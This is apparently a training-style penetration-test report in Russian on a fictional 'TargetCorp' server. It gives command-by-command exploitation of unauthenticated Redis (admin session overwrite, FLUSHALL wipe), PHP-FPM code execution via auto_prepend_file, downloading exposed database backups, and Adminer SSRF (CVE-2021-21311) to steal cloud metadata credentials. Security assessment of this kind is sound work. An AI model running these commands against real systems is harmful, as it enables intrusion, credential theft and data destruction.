## Отчет о проведении анализа защищённости внешнего периметра компании TargetCorp, сервер с IP-адресом 2.12.85.6

**Взаимодействие с Redis (порт 6379)**

Описание уязвимости: Для взаимодействия с Redis не нужна аутентификация. То есть можно свободно выполнять любые действия на сервисе, при этом не являясь администратором или сотрудником компании.

Риски: Зависят от того, что храниться на самом сервере. (А в нашем случае скорее всего это хранилище сессий и конфигурационных данных)
1. Захват учетных сессий пользователей.
2. Кража конфига, в котором могут храниться пароли и информация о бд, а также информации о сервере. 
3. Отравление кеша:
   - злоумышленник может положить сайт на продолжительное время. (что может нести большие потери для бизнеса, к примеру: сайт для заказа техники, если сервис упадет на пару часов, клиенты просто закажут в другом месте)
   - внедрение вредоностного кода (для кражи чувствительной информации клиентов)
4. Удаление всех данных в сервисе, командой `FLUSHALL` к примеру. (что тоже скорее всего положит сервис, тк некоторые компоненты могут зависеть от работы кеша + производительность упадет, тк задача редиса это оптимизировать нагрузку, которая идет на приложение)

Эксплуатация:
1. Сначала подключиться к cli редиса, то есть подключиться к самому сервису. Отправить `ping` на сервер для подтверждения подключения. Примеры команд и ответов:
```
$ redis-cli -h 2.12.85.6
2.12.85.6:6379> PING
PONG
```
2. Посмотреть ключи, которые храняться на сервисе. Пример команды и ответа:
```
2.12.85.6:6379> KEYS *
1) "session:admin:9f3a2b"
2) "config:database"
3) "cache:page:main"
```
3. Посмотреть информацию о сервисе. Пример команды и ответа:
```
2.12.85.6:6379> INFO server
# Server
redis_version:7.0.11
os:Linux 5.15.0-91-generic x86_64
...
```
4. Посмотреть директорию где редис хранит файл бд и файл, в котором находятся данные самого редиса (дамп файл). Примеры команд:
```
2.12.85.6:6379> CONFIG GET dir
2.12.85.6:6379> CONFIG GET dbfilename
```
5. (в приницпе пункты 2, 3 и 4 можно выполнять в любом порядке, просто собираем все возможную информацию о сервисе)
6. Подмена сессии админа. Пример команды:
```
2.12.85.6:6379> SET session:admin:9f3a2b "new_token"
```
8. (ps для внедрения вредоносного кода нужно знать нюансы работы самого сервиса: есть ли у нас доступ для этого, как настроен сервис и т.д. поэтому оставлю это как пометку в рисках, так как дополнительной информации для составления хорошего `payload` не предоставлено)

**Взаимодействие с PHP-FPM / FastCGI (порт 9000)**

Описание уязвимости: Для взаимодействия с FastCGI не требуется аутентификация. 

Риски: PHP-FPM это сервис, который обрабатывает PHP-код. Значит, мы можем запускать PHP файлы на сервере.

Эксплуатация:
1. Подключаемся к самому сервису. Пример команды:
```
cgi-fcgi -bind -connect 2.12.85.6:9000
```
2. Отправляем запрос на выполнение файла. В самой команде скрипт создает FastCGI-пакет с параметром `PHP_VALUE auto_prepend_file = php://input`, а затем в теле запроса передаёт PHP-код. Пример команды и ответа:
```
$ python3 fcgi_exploit.py 2.12.85.6 9000 /var/www/html/index.php

X-Powered-By: PHP/8.1.2
Content-type: text/html; charset=UTF-8
 
<!DOCTYPE html>
<html>
<head><title>TargetCorp - Corporate Portal</title></head>
...
```
3. (ps через PHP файлы на сервере можно попытаться передать PHP-код с вызовами system(), exec() или shell_exec(), что приведет к RCE, но опять же оставлю как пометку, тк для составления конкретного payload нужно больше информации о самом сервере)

**Взаимодействие с веб-приложением (порт 80)**

Описание уязвимости: Открытая директория /backup/ и robots.txt.

Риски: Из бекапа можно получить пароли, структуру бд или конфигурационные файлы. Robots.txt дает дополнительную информацию о скрытых endpoints (которые и ведут нас к открытому backup).

Эксплуатация:
1. Запросить robots.txt. Пример запроса и ответа:
```
$ curl http://2.12.85.6/robots.txt

User-agent: *
Disallow: /admin/
Disallow: /backup/ 
```
2. Запросить директорию /backup. Пример запроса и ответа:
```
$ curl http://2.12.85.6/backup/

<title>Index of /backup/</title>
<a href="db_dump_2024-01-15.sql.gz">db_dump_2024-01-15.sql.gz</a>   15-Jan-2024 03:00  2.4M
<a href="site_config.tar.gz">site_config.tar.gz</a>              15-Jan-2024 03:00  156K
``` 
3. Скачать дамп бд. Пример команды:
```
$ wget http://2.12.85.6/backup/db_dump_2024-01-15.sql.gz
gunzip db_dump_2024-01-15.sql.gz
```
4. Скачать конфигурацию. Пример команды:
```
wget http://2.12.85.6/backup/site_config.tar.gz
tar -xzvf site_config.tar.gz
```
5. Уже после анализируем дапм и конфигурацию, чтобы собрать информацию.

**Взаимодействие с Adminer (порт 8080)**

Описание уязвимости: Интерфейс Adminer с формой входа и подключению к MySQL.

Риски: Возможно свободное подключение к MySQL, тк у нас есть доступ к дампу бд, а там можно найти креды (см Взаимодействие с веб-приложением (порт 80)). Либо перебором найти логин и пароль, если нет защиты от брутфорса или сам пароль несложный.

Эксплуатация: 
1. Находим креды от формы в дампе или подбираем пароль.
2. Подключаемся к MySQL.
3. Читаем таблицы и всю информацию о бд.
   
Дополнительно: 
CVE-2021-21311 (SSRF)
Сама суть CVEшки в неграмотной обработке ошибок (в файлах драйверов Elasticsearch (elastic.inc.php) и ClickHouse (clickhouse.inc.php)). Если код HTTP-ответа не был равен 200, уязвимый код присваивает весь текст сообщения об ошибке, которое потом отображается пользователю. Это позволяет злоумышленникe считывать ответы с произвольных внутренних точек HTTP, указывая их в качестве адреса сервера бд.

1. Просканировать внутренние порты с помощью параметра server. (Если ответ будет быстрый, то порт скорее всего закрыт, если долгий, то открыт) Пример команды:
```
curl -v "http://2.12.85.6:8080/?server=127.0.0.1:22&username=&db="
```
2. Украсть метаданные. Пример команды:
Чтобы найти путь до данных: (в ошибке как раз отобразиться специфичное имя)
```
curl -v -X POST 'http://2.12.85.6:8080/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'auth[driver]=elasticsearch&auth[server]=http://169.254.169.254/latest/meta-data/iam/security-credentials/&auth[username]=&auth[db]='
```
3. Подставляем путь до данных и должны вернуться AccessKeyId, SecretAccessKey и Token, которые дают доступ к облачным ресурсам.
```
curl -X POST -v \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "auth[driver]=elasticsearch&auth[server]=http://169.254.169.254/latest/meta-data/iam/security-credentials/ИМЯ_РОЛИ/&auth[username]=&auth[db]=" \
  http://2.12.85.6:8080/
```
